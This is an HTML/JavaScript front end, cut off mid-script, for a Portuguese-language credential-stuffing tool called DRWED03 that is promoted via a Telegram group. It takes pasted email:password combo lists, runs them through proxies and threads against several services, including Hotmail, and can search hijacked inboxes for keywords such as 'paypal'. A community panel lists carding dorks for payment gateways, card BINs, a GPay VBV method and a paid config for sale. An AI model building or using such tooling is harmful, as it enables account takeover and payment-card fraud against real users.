                <li><a onclick="showSection('comunidade')">Comunidade</a></li>
                <li><a onclick="showSection('limpeza')">Limpeza</a></li>
            </ul>
        </div>
        <div class="header-right">
            <span class="header-tag">@wedze_grupo</span>
            <a href="https://t.me/wedze_grupo" target="_blank" rel="noopener noreferrer" class="telegram-link-header">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21.5 2L2 9.5L8.5 14.5L12 22L21.5 2Z"/><path d="M21.5 2L8.5 14.5"/></svg>
                Telegram
            </a>
        </div>
    </header>

    <main class="app-container active">

        <section id="section-home" class="section-content active">
            <div class="hero-section">
                <div class="avatar-wrapper">
                    <div class="avatar-glow"></div>
                 <img class="avatar-img" src="{{ url_for('static', filename='avatar.png') }}">
                </div>
                <h1 class="hero-title">DRWED03</h1>
                <p class="hero-subtitle">By  wedze_grupo</p>
                <a href="https://t.me/wedze_grupo" target="_blank" class="hero-creator-link">@wedze_grupo</a>
            </div>
        </section>

        <section id="section-sistema" class="section-content">
            <div class="hero-section" style="margin-bottom: 0.3rem; padding-bottom: 0.3rem;">
                <h2 style="font-family: 'Space Grotesk', sans-serif; color: #fff; font-size: 1.6rem;">5 em 1 CHK | W CHK</h2>
            </div>

            <!-- 5 CHECKBOXES -->
            <div class="api-selector">
                <div class="api-checkbox selected" onclick="toggleApi(this)">
                    <input type="checkbox" id="api-mnv" checked value="mnv">
                    <label for="api-mnv">MNV</label>
                    <span class="api-badge">Meu Numero Virtual</span>
                </div>
                <div class="api-checkbox" onclick="toggleApi(this)">
                    <input type="checkbox" id="api-sisreg" value="sisreg">
                    <label for="api-sisreg">SISREG</label>
                    <span class="api-badge">SISREG III</span>
                </div>
                <div class="api-checkbox" onclick="toggleApi(this)">
                    <input type="checkbox" id="api-sms24h" value="sms24h">
                    <label for="api-sms24h">SMS24H</label>
                    <span class="api-badge">SMS24H.org</span>
                </div>
                <div class="api-checkbox" onclick="toggleApi(this)">
                    <input type="checkbox" id="api-emailnator" value="emailnator">
                    <label for="api-emailnator">Emailnator</label>
                    <span class="api-badge">Premium</span>
                </div>
                <div class="api-checkbox" onclick="toggleApi(this)">
                    <input type="checkbox" id="api-hotmail" value="hotmail">
                    <label for="api-hotmail">Hotmail</label>
                    <span class="api-badge hotmail-badge">Checker</span>
                </div>
            </div>

            <!-- CARDS -->
            <div class="cards-grid">
                <div class="premium-card card-approved">
                    <div class="card-indicator ind-approved"></div>
                    <div class="card-icon">✅</div>
                    <div class="card-number" id="num-lives">0</div>
                    <span class="card-label">Aprovados</span>
                </div>
                <div class="premium-card card-rejected">
                    <div class="card-indicator ind-rejected"></div>
                    <div class="card-icon">⛔</div>
                    <div class="card-number" id="num-dies">0</div>
                    <span class="card-label">Recusados</span>
                </div>
                <div class="premium-card card-tested">
                    <div class="card-indicator ind-tested"></div>
                    <div class="card-icon">⚡</div>
                    <div class="card-number" id="num-tested">0</div>
                    <span class="card-label">Testados</span>
                </div>
                <div class="premium-card card-loaded">
                    <div class="card-indicator ind-loaded"></div>
                    <div class="card-icon">📦</div>
                    <div class="card-number" id="num-loaded">0</div>
                    <span class="card-label">Carregados</span>
                </div>
            </div>

            <!-- PROXY CONFIG -->
            <div class="input-section">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
                    <span style="font-size: 0.7rem; color: var(--text-muted); font-family: 'JetBrains Mono', monospace;">
                        Proxy Usage: <span id="usageText">0MB / 1024MB</span>
                    </span>
                </div>
                <div id="proxyWarning" class="proxy-alert">ALERTA: Seu trafego de proxy esta acabando! Abasteca com mais 1GB.</div>
                <div class="proxy-config-box">
                    <span id="proxyStatus" class="proxy-status"> Nenhum proxy configurado</span>
                    <input type="text" id="proxyUrlInput" placeholder="http://usuario:senha@servidor:porta">
                    <button class="btn-success" onclick="setProxy()">DEFINIR</button>
                    <button class="btn-small" onclick="clearProxy()">LIMPAR</button>
                </div>

                <!-- HOTMAIL OPTIONS - aparece quando Hotmail esta marcado -->
                <div class="hotmail-options" id="hotmailOptions">
                    <div style="font-size: 0.7rem; color: #0078d4; font-weight: bold; margin-bottom: 0.3rem;">Hotmail Checker Options</div>
                    <div class="option-row">
                        <label>
                            <input type="radio" name="hotmailMode" value="fastest" checked>
                            Fastest (so login)
                        </label>
                        <label>
                            <input type="radio" name="hotmailMode" value="search">
                            Keyword Search
                        </label>
                        <input type="text" id="hotmailKeyword" placeholder="Palavra para buscar (ex: paypal)" disabled>
                    </div>
                    <div class="option-row" style="margin-top: 0.3rem;">
                        <label>
                            <input type="checkbox" id="hotmailProxy" checked>
                            Usar Proxy no Hotmail
                        </label>
                        <span style="font-size: 0.6rem; color: var(--text-muted);">(se proxy configurado)</span>
                    </div>
                </div>

                <div class="input-header">
                    <div class="input-label">Painel de Insercao</div>
                    <div class="input-actions">
                        <button class="btn-action" onclick="fillExample()">Exemplo</button>
                        <button class="btn-action" onclick="clearInput()">Limpar</button>
                        <button class="btn-action" onclick="pasteClipboard()">Colar</button>
                    </div>
                </div>
                <textarea id="number-input" class="input-area" placeholder="Cole suas contas no formato: email:senha ..."></textarea>
                <div class="btn-primary-container">
                    <div class="processing-status" id="processing-status">
                        <div class="spinner"></div>
                        <span id="progress-text">Processando...</span>
                    </div>
                    <label class="threads-control" for="threads-count">
                        Threads:
                        <select id="threads-count">
                            <option value="1">1x</option>
                            <option value="2" selected>2x</option>
                            <option value="3">3x</option>
                            <option value="4">4x</option>
                            <option value="5">5x</option>
                        </select>
                    </label>
                    <button class="btn-primary" id="btn-start" onclick="processNumbers()">INICIAR</button>
                    <button class="btn-stop" id="btn-stop" onclick="stopProcessing()">PARAR</button>
                </div>
            </div>

            <!-- RESULTS -->
            <div class="results-wrapper" id="results-wrapper">
                <!-- Lives -->
                <div class="result-box">
                    <div class="result-box-header">
                        <div class="result-box-title lives">LIVES</div>
                        <div style="display: flex; gap: 0.4rem; flex-wrap: wrap;">
                            <button class="btn-copy" onclick="copyResults('lives-full', event)">COPIAR TUDO</button>
                            <button class="btn-copy" onclick="copyResults('lives-logs', event)">COPIAR LOGS</button>
                        </div>
                    </div>
                    <div id="live-results-lives" class="result-list">
                        <div class="empty-state">[ AGUARDANDO DADOS ]</div>
                    </div>
                </div>
                <!-- Dies -->
                <div class="result-box">
                    <div class="result-box-header">
                        <div class="result-box-title dies">DIES</div>
                        <div style="display: flex; gap: 0.4rem; flex-wrap: wrap;">
                            <button class="btn-copy" onclick="copyResults('dies-full', event)">COPIAR TUDO</button>
                            <button class="btn-copy" onclick="copyResults('dies-logs', event)">COPIAR LOGS</button>
                        </div>
                    </div>
                    <div id="live-results-dies" class="result-list">
                        <div class="empty-state">[ AGUARDANDO DADOS ]</div>
                    </div>
                </div>
            </div>
        </section>

        <section id="section-status" class="section-content">
            <div class="hero-section" style="margin-bottom: 0.3rem; padding-bottom: 0.3rem;">
                <h2 style="font-family: 'Space Grotesk', sans-serif; color: #fff; font-size: 1.6rem;">STATUS DO SISTEMA</h2>
                <p class="hero-subtitle">5 em 1 - DRWED03</p>
            </div>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 1rem;">
                <div class="premium-card" style="text-align: center;">
                    <div style="font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase;">API Principal</div>
                    <div style="font-size: 1.6rem; margin: 6px 0; color: #00e676;"> ONLINE</div>
                    <div style="font-size: 0.65rem; color: var(--text-muted);">Latencia: 120ms</div>
                </div>
                <div class="premium-card" style="text-align: center;">
                    <div style="font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase;">Sistema</div>
                    <div style="font-size: 1.6rem; margin: 6px 0; color: #00e676;"> OPERACIONAL</div>
                    <div style="font-size: 0.65rem; color: var(--text-muted);">Timeout: 20s</div>
                </div>
                <div class="premium-card" style="text-align: center;">
                    <div style="font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase;">Conexao</div>
                    <div style="font-size: 1.6rem; margin: 6px 0; color: #00e676;"> ESTAVEL</div>
                    <div style="font-size: 0.65rem; color: var(--text-muted);">Pacotes: 0% perda</div>
                </div>
            </div>
        </section>

        <section id="section-comunidade" class="section-content">
            <div class="hero-section" style="margin-bottom: 0.3rem; padding-bottom: 0.3rem;">
                <h2 style="font-family: 'Space Grotesk', sans-serif; color: #fff; font-size: 1.6rem;">COMUNIDADE</h2>
                <p class="hero-subtitle">Onde so tem crias DRWED03</p>
            </div>
            <div class="comunidade-grid">
                <div class="comunidade-card">
                    <div style="font-size: 2.2rem; margin-bottom: 0.6rem;">🔥</div>
                    <h3>Ultimos Lancamentos</h3>
                    <p>Confira os drops recentes da comunidade:</p>
                    <div class="drop-list">
                        <div class="drop-item"><span style="color: #00e676;"></span> X44_HITS_GRINGA (05/08)</div>
                        <div class="drop-item"><span style="color: #00e676;"></span> X54_HITS_GRINGA (05/08)</div>
                        <div class="drop-item"><span style="color: #00e676;"></span> X91_HITS_GRINGA (06/08)</div>
                        <div class="drop-item"><span style="color: #249cf1;"></span> Checker SMS24, Sisregi, Norton</div>
                    </div>
                    <a href="https://t.me/wedze_grupo" target="_blank" class="btn-comunidade">VER MAIS DROPS</a>
                </div>
                <div class="comunidade-card">
                    <div style="font-size: 2.2rem; margin-bottom: 0.6rem;">🎡</div>
                    <h3>Dorks & Truques</h3>
                    <p>Dorks poderosas para encontrar gateways Nuvemshop + Pagarme.</p>
                    <div class="code-block">
                        "meios de envio" "api_4190" "asaas" "calcinhas"<br><br>
                        "meios de envio" "api_4190" "appmax" "meia"
                    </div>
                    <p style="font-size: 0.65rem; text-align: center; color: var(--text-muted);">
                        Bin: 512267 (Nuvemshop + pagarme)<br>
                        Testem novos drops!
                    </p>
                    <a href="https://t.me/wedze_grupo" target="_blank" class="btn-comunidade">VER DORKS</a>
                </div>
                <div class="comunidade-card">
                    <div style="font-size: 2.2rem; margin-bottom: 0.6rem;">💳</div>
                    <h3>Ferramentas & Metodos</h3>
                    <p>Configuracoes avancadas e metodos de pagamento via GPay.</p>
                    <div class="drop-list" style="border-left: 2px solid #a855f7;">
                        <p style="margin-bottom: 6px;"> <strong style="color:#a855f7;">CONFIG HOTMAIL INBOX SEARCH 2 em 1</strong><br><span style="color: #fff;">R$ 300,00</span></p>
                        <p> <strong style="color:#a855f7;">Metodo GPay</strong><br>Bin 374769, puxe as vbv SMS ativo.</p>
                    </div>
                    <a href="https://t.me/wedze_grupo" target="_blank" class="btn-comunidade" style="border-color: #6b2bff; color: #6b2bff;">ACESSAR REFS</a>
                </div>
            </div>
        </section>


        <section id="section-limpeza6" class="section-content">
            <div class="hero-section" style="margin-bottom: 0.4rem; padding-bottom: 0.3rem;">
                <h2 style="font-family: 'Space Grotesk', sans-serif; color: #fff; font-size: 1.6rem;">LIMPEZA</h2>
                <p class="hero-subtitle">Central de manutencao profunda do Windows</p>
            </div>
            <div class="l6-shell">
                <div class="l6-tabs">
                    <button class="l6-tab active" data-l6-tab="limpeza">LIMPEZA</button>
                    <button class="l6-tab" data-l6-tab="sistema">SISTEMA</button>
                    <button class="l6-tab" data-l6-tab="rede">REDE</button>
                    <button class="l6-tab" data-l6-tab="navegadores">NAVEGADORES</button>
                    <button class="l6-tab" data-l6-tab="privacidade">PRIVACIDADE</button>
                    <button class="l6-tab" data-l6-tab="info">INFO</button>
                </div>
                <div class="l6-panel active" data-l6-panel="limpeza">
                    <div class="input-header"><span class="input-label">LIMPEZA PROFUNDA</span><button class="btn-action" onclick="l6Scan()">ANALISAR AGORA</button></div><div class="l6-tools"><button class="btn-cyber" onclick="l6Analyze('limpeza')">ANALISE DETALHADA</button><button class="btn-cyber" onclick="l6ToggleConfig('config-limpeza')">CONFIGURAR</button><button class="btn-cyber" onclick="l6ToggleManual('manual-limpeza')">MANUAL</button></div><div class="l6-config" id="config-limpeza"><label>Idade minima dos logs: <select><option>30 dias</option><option>60 dias</option><option>90 dias</option></select></label><label><input type="checkbox" checked> Ignorar arquivos em uso</label><label><input type="checkbox" checked> Preservar documentos, Downloads, cookies e senhas</label></div><div class="l6-analysis" id="analysis-limpeza">Nenhuma analise detalhada executada.</div><div class="l6-manual" id="manual-limpeza"><strong>Manual da Limpeza:</strong> primeiro use Analise Detalhada para contar arquivos e espaco. Selecione as categorias desejadas, revise a previsao e so entao execute. Arquivos em uso sao ignorados; documentos, senhas, cookies e Downloads ficam fora do escopo.</div>
                    <div class="l6-checks" id="l6-checks">
                        <label class="l6-check"><input type="checkbox" value="user_temp" checked> Temporarios do usuario</label>
                        <label class="l6-check"><input type="checkbox" value="windows_temp" checked> Temporarios do Windows</label>
                        <label class="l6-check"><input type="checkbox" value="windows_update" checked> Cache do Windows Update</label>
                        <label class="l6-check"><input type="checkbox" value="prefetch"> Prefetch</label>
                        <label class="l6-check"><input type="checkbox" value="thumbnails" checked> Miniaturas do Windows</label>
                        <label class="l6-check"><input type="checkbox" value="browser_cache"> Cache dos navegadores</label>
                        <label class="l6-check"><input type="checkbox" value="crash_dumps" checked> Relatorios de falha</label>
                        <label class="l6-check"><input type="checkbox" value="old_logs"> Logs antigos +30 dias</label>
                    </div>
                    <button class="btn-primary" onclick="l6Clean()">LIMPAR SELECIONADOS</button>
                    <div class="l6-result" id="l6-scan-result">Aguardando analise.</div>
                </div>
                <div class="l6-panel" data-l6-panel="sistema">
                    <div class="input-label">COMPONENTES DO SISTEMA</div><div class="l6-tools"><button class="btn-cyber" onclick="l6Analyze('sistema')">ANALISAR SISTEMA</button><button class="btn-cyber" onclick="l6ToggleConfig('config-sistema')">CONFIGURAR</button><button class="btn-cyber" onclick="l6ToggleManual('manual-sistema')">MANUAL</button></div><div class="l6-config" id="config-sistema"><label><input type="checkbox" checked> Criar relatorio antes da limpeza</label><label><input type="checkbox" checked> Nao interromper arquivos em uso</label></div><div class="l6-analysis" id="analysis-sistema">Nenhuma analise executada.</div><div class="l6-manual" id="manual-sistema"><strong>Manual do Sistema:</strong> a Lixeira e reversivel antes do esvaziamento. Os logs Application, System e Setup sao diagnosticos e a limpeza e destrutiva; execute apenas com confirmacao e privilegios adequados.</div>
                    <div class="l6-routine"><div><strong>Esvaziar Lixeira</strong><small>Remove os itens atualmente armazenados na Lixeira.</small></div><button class="btn-cyber" onclick="l6Action('recycle','Esvaziar Lixeira')">EXECUTAR</button></div>
                    <div class="l6-routine"><div><strong>Limpar logs do Windows (Event Viewer)</strong><small>Limpa Application, System e Setup apos confirmacao.</small></div><button class="btn-danger" onclick="l6Action('events','Logs do Windows')">LIMPAR</button></div>
                    <div class="l6-result" id="l6-system-result">Aguardando acao.</div>
                </div>
                <div class="l6-panel" data-l6-panel="rede">
                    <div class="input-label">ROTINAS AUTOMATICAS DE REDE</div><div class="l6-tools"><button class="btn-cyber" onclick="l6Analyze('rede')">DIAGNOSTICO DETALHADO</button><button class="btn-cyber" onclick="l6ToggleConfig('config-rede')">CONFIGURAR</button><button class="btn-cyber" onclick="l6ToggleManual('manual-rede')">MANUAL</button></div><div class="l6-config" id="config-rede"><label>Host de teste: <input value="127.0.0.1" aria-label="Host de teste"></label><label><input type="checkbox" checked> Testar gateway e DNS</label><label><input type="checkbox"> Aplicar reset completo automaticamente</label></div><div class="l6-analysis" id="analysis-rede">Nenhum diagnostico executado.</div><div class="l6-manual" id="manual-rede"><strong>Manual da Rede:</strong> comece pelo diagnostico. Flush DNS e a acao mais simples. Release/Renew pode desconectar temporariamente. O reset completo de Winsock/IP/IPv6 pode exigir administrador e reinicializacao.</div>
                    <div class="l6-routine"><div><strong>Reset completo de rede</strong><small>DNS + Winsock + IP + IPv6 + ARP + DHCP.</small></div><button class="btn-primary" onclick="l6Action('reset','Reset completo de rede')">EXECUTAR</button></div>
                    <div class="l6-routine"><div><strong>Limpar apenas Cache DNS</strong><small>Executa ipconfig /flushdns.</small></div><button class="btn-cyber" onclick="l6Action('dns','Cache DNS')">EXECUTAR</button></div>
                    <div class="l6-routine"><div><strong>Liberar e Renovar IP</strong><small>Executa release e renew DHCP.</small></div><button class="btn-cyber" onclick="l6Action('renew','Release + Renew')">EXECUTAR</button></div>
                    <div class="l6-result" id="l6-network-result">Aguardando diagnostico.</div>
                </div>
                <div class="l6-panel" data-l6-panel="navegadores">
                    <div class="input-label">CACHE DE NAVEGADORES</div><div class="l6-tools"><button class="btn-cyber" onclick="l6Analyze('navegadores')">ANALISAR CACHES</button><button class="btn-cyber" onclick="l6ToggleConfig('config-navegadores')">CONFIGURAR</button><button class="btn-cyber" onclick="l6ToggleManual('manual-navegadores')">MANUAL</button></div><div class="l6-config" id="config-navegadores"><label><input type="checkbox" checked> Chrome</label><label><input type="checkbox" checked> Edge</label><label><input type="checkbox" checked> Firefox</label><label><input type="checkbox" checked> Brave / Opera GX</label></div><div class="l6-analysis" id="analysis-navegadores">Nenhuma analise executada.</div><div class="l6-manual" id="manual-navegadores"><strong>Manual dos Navegadores:</strong> feche os navegadores antes de limpar. A rotina trabalha somente com cache temporario. Cookies, senhas, historico, favoritos e dados de login nao sao selecionados.</div>
                    <div class="l6-routine"><div><strong>Chrome, Edge, Firefox, Brave e Opera GX</strong><small>Somente cache temporario; cookies, senhas e historico ficam protegidos.</small></div><button class="btn-primary" onclick="l6CleanBrowser()">LIMPAR CACHE</button></div>
                    <div class="l6-result" id="l6-browser-result">Feche os navegadores antes da limpeza.</div>
                </div>
                <div class="l6-panel" data-l6-panel="privacidade">
                    <div class="input-label">LIMPEZA DE PRIVACIDADE</div><div class="l6-tools"><button class="btn-cyber" onclick="l6Analyze('privacidade')">ANALISAR RASTROS</button><button class="btn-cyber" onclick="l6ToggleConfig('config-privacidade')">CONFIGURAR</button><button class="btn-cyber" onclick="l6ToggleManual('manual-privacidade')">MANUAL</button></div><div class="l6-config" id="config-privacidade"><label><input type="checkbox" checked> Arquivos recentes</label><label><input type="checkbox"> Area de transferencia</label><label><input type="checkbox" checked> Pedir confirmacao individual</label></div><div class="l6-analysis" id="analysis-privacidade">Nenhuma analise executada.</div><div class="l6-manual" id="manual-privacidade"><strong>Manual da Privacidade:</strong> a analise nao le o conteudo da area de transferencia. Arquivos recentes sao atalhos de uso do Windows. Cada acao pede confirmacao antes de alterar dados.</div>
                    <div class="l6-routine"><div><strong>Limpar arquivos recentes</strong><small>Remove atalhos da pasta de itens recentes.</small></div><button class="btn-cyber" onclick="l6Action('recent','Arquivos recentes')">LIMPAR</button></div>
                    <div class="l6-routine"><div><strong>Limpar area de transferencia</strong><small>Apaga o conteudo atualmente copiado.</small></div><button class="btn-cyber" onclick="l6Action('clipboard','Area de transferencia')">LIMPAR</button></div>
                    <div class="l6-result" id="l6-privacy-result">Nenhuma acao executada.</div>
                </div>
                <div class="l6-panel" data-l6-panel="info">
                    <div class="input-label">INFO DO COMPUTADOR</div><div class="l6-tools"><button class="btn-cyber" onclick="l6Analyze('info')">ANALISE COMPLETA</button><button class="btn-cyber" onclick="l6ToggleConfig('config-info')">CONFIGURAR</button><button class="btn-cyber" onclick="l6ToggleManual('manual-info')">MANUAL</button></div><div class="l6-config" id="config-info"><label><input type="checkbox" checked> Mostrar armazenamento</label><label><input type="checkbox" checked> Mostrar versao do sistema</label><label><input type="checkbox"> Exportar relatorio</label></div><div class="l6-analysis" id="analysis-info">Nenhuma analise executada.</div><div class="l6-manual" id="manual-info"><strong>Manual da Info:</strong> esta aba e somente leitura. Ela consulta identificacao do computador, sistema operacional, CPU, Python e armazenamento; nao modifica configuracoes.</div>
                    <button class="btn-cyber" onclick="l6Info()">ATUALIZAR INFO</button>
                    <div class="l6-result" id="l6-info-result">Aguardando consulta.</div>
                </div>
            </div>
        </section>

    </main>

    <footer>
        <div style="font-size: 0.9rem; font-weight: bold; color: #6b2bff;">DRWED03</div>
        <div>by <a href="https://t.me/wedze_grupo" target="_blank" style="color: #fff;">t.me/wedze_grupo</a></div>
        <div style="font-size: 0.55rem; opacity: 0.5;">&copy; 2026 DRWED03</div>
    </footer>

    <script>

        // ===== LIMPEZA 6: subabas internas =====
        document.querySelectorAll('[data-l6-tab]').forEach(function(button) {
            button.addEventListener('click', function() {
                const tab = button.dataset.l6Tab;
                document.querySelectorAll('[data-l6-tab]').forEach(function(item) { item.classList.remove('active'); });
                document.querySelectorAll('[data-l6-panel]').forEach(function(item) { item.classList.remove('active'); });
                button.classList.add('active');
                const panel = document.querySelector('[data-l6-panel="' + tab + '"]');
                if (panel) panel.classList.add('active');
                if (tab === 'info') l6Info();
            });
        });

        function l6FormatBytes(value) {
            if (!value) return '0 B';
            const units = ['B', 'KB', 'MB', 'GB']; let n = Number(value), i = 0;
            while (n >= 1024 && i < units.length - 1) { n /= 1024; i++; }
            return n.toFixed(i ? 1 : 0) + ' ' + units[i];
        }
        function l6Result(id, text) { const el = document.getElementById(id); if (el) el.textContent = text; }
        function l6ToggleConfig(id) { const el = document.getElementById(id); if (el) el.classList.toggle('open'); }
        function l6ToggleManual(id) { const el = document.getElementById(id); if (el) el.classList.toggle('open'); }
        async function l6Analyze(target) {
            const output = document.getElementById('analysis-' + target);
            if (output) output.textContent = 'Executando analise somente leitura...';
            try {
                const data = await fetch('/limpeza6/analyze/' + encodeURIComponent(target), {cache:'no-store'}).then(function(r) { return r.json(); });
                if (data.error) throw new Error(data.error);
                const a = data.analysis || {};
                let lines = ['ALVO: ' + target.toUpperCase()];
                if (a.total_files !== undefined) lines.push('Arquivos encontrados: ' + a.total_files, 'Espaco estimado: ' + l6FormatBytes(a.total_bytes));
                if (a.recent_items !== undefined) lines.push('Atalhos recentes: ' + a.recent_items, 'Clipboard: ' + a.clipboard);
                if (a.hostname) lines.push('Computador: ' + a.hostname, 'Sistema: ' + a.system + ' ' + a.release, 'CPU logica: ' + a.cpu, 'Disco livre: ' + l6FormatBytes(a.disk.free));
                if (a.checks) a.checks.forEach(function(check) { lines.push(check.command + ': ' + (check.ok ? 'OK' : 'falhou'), check.output || ''); });
                if (a.items) Object.keys(a.items).forEach(function(key) { const item = a.items[key]; lines.push(item.name + ': ' + item.files + ' arquivos / ' + l6FormatBytes(item.bytes)); });
                if (output) output.textContent = lines.join('\\n');
            } catch (error) { if (output) output.textContent = 'Falha na analise: ' + error.message; }
        }
        async function l6Scan() {
            l6Result('l6-scan-result', 'Analisando pastas conhecidas...');
            try {
                const data = await fetch('/limpeza6/scan').then(function(r) { return r.json(); });
                const lines = ['Arquivos encontrados: ' + data.total_files, 'Espaco potencial: ' + l6FormatBytes(data.total_bytes)];
                Object.keys(data.items || {}).forEach(function(key) { const item = data.items[key]; lines.push(item.name + ': ' + item.files + ' arquivos / ' + l6FormatBytes(item.bytes)); });
                l6Result('l6-scan-result', lines.join('\\n'));
            } catch (error) { l6Result('l6-scan-result', 'Falha na analise: ' + error.message); }
        }
        async function l6Clean(categories, resultId) {
            const selected = categories || Array.from(document.querySelectorAll('#l6-checks input:checked')).map(function(input) { return input.value; });
            if (!selected.length) return l6Result(resultId || 'l6-scan-result', 'Selecione pelo menos uma categoria.');
            if (!confirm('Confirmar a limpeza dos itens selecionados?')) return;
            const target = resultId || 'l6-scan-result'; l6Result(target, 'Executando limpeza...');
            try {
                const data = await fetch('/limpeza6/clean', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({categories: selected, confirmed: true}) }).then(function(r) { return r.json(); });
                const total = (data.results || []).reduce(function(sum, item) { return sum + (item.removed || 0); }, 0);
                l6Result(target, 'Concluido. Arquivos removidos: ' + total + '\\n' + JSON.stringify(data.results || [], null, 2));
            } catch (error) { l6Result(target, 'Falha na limpeza: ' + error.message); }
        }
        function l6CleanBrowser() { l6Clean(['browser_cache'], 'l6-browser-result'); }
        async function l6Action(action, label) {
            if (!confirm('Confirmar: ' + label + '?')) return;
            const target = action === 'reset' || action === 'dns' || action === 'renew' ? 'l6-network-result' : action === 'recycle' || action === 'events' ? 'l6-system-result' : 'l6-privacy-result';
            l6Result(target, 'Executando ' + label + '...');
            try {
                const data = await fetch('/limpeza6/action', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: action, confirmed: true})}).then(function(r) { return r.json(); });
                l6Result(target, (data.ok ? 'Concluido' : 'Concluido com avisos') + '\\n' + JSON.stringify(data.results || data, null, 2));
            } catch (error) { l6Result(target, 'Falha: ' + error.message); }
        }
        async function l6Info() {
            l6Result('l6-info-result', 'Consultando informacoes...');
            try {
                const data = await fetch('/limpeza6/info').then(function(r) { return r.json(); });
                l6Result('l6-info-result', ['Computador: ' + data.hostname, 'Sistema: ' + data.system + ' ' + data.release, 'Arquitetura: ' + data.machine, 'Processador: ' + data.processor, 'CPU logica: ' + data.cpu, 'Python: ' + data.python, 'Disco total: ' + l6FormatBytes(data.disk.total), 'Disco usado: ' + l6FormatBytes(data.disk.used), 'Disco livre: ' + l6FormatBytes(data.disk.free)].join('\\n'));
            } catch (error) { l6Result('l6-info-result', 'Falha ao consultar INFO: ' + error.message); }
        }

        // ========== NAVEGACAO ==========
        function showSection(sectionId) {
            document.querySelectorAll('.section-content').forEach(el => el.classList.remove('active'));
            document.getElementById('section-' + sectionId).classList.add('active');
            document.querySelectorAll('.header-nav a').forEach(el => el.classList.remove('active'));
            const activeLink = Array.from(document.querySelectorAll('.header-nav a')).find(a => a.getAttribute('onclick').includes(sectionId));
            if(activeLink) activeLink.classList.add('active');
        }

        // ========== API SELECTOR ==========
        function toggleApi(el) {
            const checkbox = el.querySelector('input[type="checkbox"]');
            const checked = document.querySelectorAll('.api-checkbox input:checked');
            if (checked.length === 1 && checkbox.checked) return;
            checkbox.checked = !checkbox.checked;
            el.classList.toggle('selected');

            // Mostra/oculta opcoes do Hotmail
            const hotmailCheckbox = document.getElementById('api-hotmail');
            const hotmailOptions = document.getElementById('hotmailOptions');
            if (hotmailCheckbox && hotmailCheckbox.checked) {
                hotmailOptions.classList.add('show');
            } else {
                hotmailOptions.classList.remove('show');
            }

            // Habilita/desabilita campo keyword
            toggleKeywordField();
        }

        function toggleKeywordField() {
            const modeSearch = document.querySelector('input[name="hotmailMode"][value="search"]');
            const keywordField = document.getElementById('hotmailKeyword');
            if (modeSearch && modeSearch.checked) {
                keywordField.disabled = false;
                keywordField.placeholder = 'Digite a palavra para buscar...';
            } else {
                keywordField.disabled = true;
                keywordField.placeholder = 'Selecione "Keyword Search" para ativar';
            }
        }

        // Event listeners para os radios do Hotmail
        document.querySelectorAll('input[name="hotmailMode"]').forEach(el => {
            el.addEventListener('change', toggleKeywordField);
        });

        function getSelectedApi() {
            const checked = document.querySelectorAll('.api-checkbox input:checked');
            if (checked.length === 0) return 'mnv';
            return Array.from(checked).map(cb => cb.value).join(',');
        }

        function getHotmailOptions() {
            const mode = document.querySelector('input[name="hotmailMode"]:checked');
            const keyword = document.getElementById('hotmailKeyword').value.trim();
            const useProxy = document.getElementById('hotmailProxy').checked;
            return {
                mode: mode ? mode.value : 'fastest',
                keyword: keyword,
                proxy: useProxy
            };
        }

        // ========== MAIN CHECKER ==========
        const inputArea = document.getElementById('number-input');
        const listLives = document.getElementById('live-results-lives');
        const listDies = document.getElementById('live-results-dies');
        const btnStart = document.getElementById('btn-start');
        const btnStop = document.getElementById('btn-stop');
        const processingStatus = document.getElementById('processing-status');
        const progressText = document.getElementById('progress-text');
        const numLives = document.getElementById('num-lives');
        const numDies = document.getElementById('num-dies');
        const numTested = document.getElementById('num-tested');
        const numLoaded = document.getElementById('num-loaded');
        const threadsCount = document.getElementById('threads-count');

        let eventSource = null;
        let isProcessing = false;
        let resultsStore = { lives: [], dies: [] };

        function contarContasCarregadas(texto) {
            return texto.split(/\\r?\\n/).map(l => l.trim()).filter(l => l && l.includes(':')).length;
        }

        function atualizarContadorCarregado() {
            numLoaded.innerText = contarContasCarregadas(inputArea.value);
        }
        inputArea.addEventListener('input', atualizarContadorCarregado);

        function fillExample() {
            inputArea.value = "exemplo@email.com:senha123\\nteste@gmail.com:minhasenha";
            atualizarContadorCarregado();
        }

        function resetTestState(clearInputValue = true) {
            if (eventSource) {
                eventSource.close();
                eventSource = null;
            }
            if (clearInputValue) inputArea.value = "";
            document.querySelectorAll('.card-number').forEach(el => el.innerText = "0");
            listLives.innerHTML = '<div class="empty-state">[ AGUARDANDO DADOS ]</div>';
            listDies.innerHTML = '<div class="empty-state">[ AGUARDANDO DADOS ]</div>';
            resultsStore = { lives: [], dies: [] };
            numLives.innerText = "0";
            numDies.innerText = "0";
            numTested.innerText = "0";
            progressText.textContent = "Aguardando dados...";
            resetButtons();
            atualizarContadorCarregado();
        }

        function clearInput() {
            resetTestState(true);
        }

        function pasteClipboard() {
            navigator.clipboard.readText().then(text => {
                inputArea.value = text;
                atualizarContadorCarregado();
            }).catch(() => alert("Erro ao colar."));
        }

        function processNumbers() {
            if (isProcessing) return;
            const rawData = inputArea.value;
            if (!rawData.trim()) {
                alert("Por favor, insira os dados no formato email:senha");
                return;
            }
            const api = getSelectedApi();
            const quantidadeThreads = Math.max(1, Math.min(parseInt(threadsCount.value, 10) || 2, 5));
            if (!api) {
                alert("Selecione pelo menos uma API!");
                return;
            }

            // Pega opcoes do Hotmail
            const hotmailOpts = getHotmailOptions();

            isProcessing = true;
            btnStart.disabled = true;
            btnStart.style.display = 'none';
            btnStop.style.display = 'block';
            processingStatus.classList.add('active');
            progressText.textContent = 'Iniciando...';
            listLives.innerHTML = '';
            listDies.innerHTML = '';
            resultsStore = { lives: [], dies: [] };
            document.querySelectorAll('.card-number').forEach(el => el.innerText = "0");
            numLoaded.innerText = contarContasCarregadas(rawData);
            if (eventSource) {
                eventSource.close();
                eventSource = null;
            }
            fetch('/start', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    numbers: rawData,
                    api: api,
                    threads: quantidadeThreads,
